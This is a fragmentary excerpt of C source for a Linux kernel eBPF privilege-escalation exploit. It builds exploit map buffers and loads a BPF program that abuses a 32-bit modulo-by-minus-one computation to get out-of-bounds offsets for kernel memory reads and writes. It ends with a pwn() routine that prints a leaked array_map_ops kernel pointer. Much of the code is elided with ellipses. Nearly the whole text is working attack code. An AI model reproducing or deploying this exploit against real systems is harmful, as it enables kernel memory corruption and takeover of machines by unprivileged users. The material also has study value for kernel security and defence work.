...
int sockets[2];
int progfd;
int  exp_mapfd, exp_mapfd1, exp_mapfd2;
int doredact = 0;
...
uint64_t exp_buf1[0x100]; 
uint64_t exp_buf2[0x100]; 
char info[0x100];
...
static int load_my_prog()
{
	struct bpf_insn my_prog[] = {
        ...
        BPF_LD_IMM64(BPF_REG_5, -1),

        BPF_ALU32_REG(BPF_MOD, BPF_REG_0, BPF_REG_5),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_5, 32),
        BPF_ALU32_IMM(BPF_ADD, BPF_REG_5, 1),

        BPF_ALU64_IMM(BPF_MUL, BPF_REG_5, 0x110), 
        BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_5), 
        BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7, 0),
        BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_0, 0x10), 

        BPF_STX_MEM(BPF_DW,BPF_REG_8,BPF_REG_5, 0x18), 
...
static void prep(void) 
{
	...
	exp_mapfd1 = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
	if(exp_mapfd1 < 0){
		__exit(strerror(errno));
	}

	exp_mapfd2 = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
	if(exp_mapfd2 < 0){
		__exit(strerror(errno));
	}
...
static void update_elem(uint32_t op)
{
	...
	bpf_update_elem(0, exp_buf1, exp_mapfd1, 0);
    writemsg();
}
...
static void pwn(void)
{
    ...
    printf("[+] leak array_map_ops:0x%llx\n", map_leak);
